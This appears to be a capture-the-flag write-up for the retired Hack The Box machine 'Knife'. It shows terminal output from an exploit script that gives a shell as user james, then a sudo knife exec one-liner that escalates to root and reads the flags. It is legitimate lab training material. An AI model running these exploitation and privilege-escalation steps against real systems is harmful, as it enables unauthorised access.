# user flag
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Knife]
└─$ python3 php_exploit.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ whoami
james

$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ cat /home/james/user.txt
bd<SNIP>8e
```

# root flag
```
james@knife:/tmp$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
root@knife:/tmp# whoami
root
root@knife:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:/tmp# cat /root/root.txt
d6<SNIP>ef

```
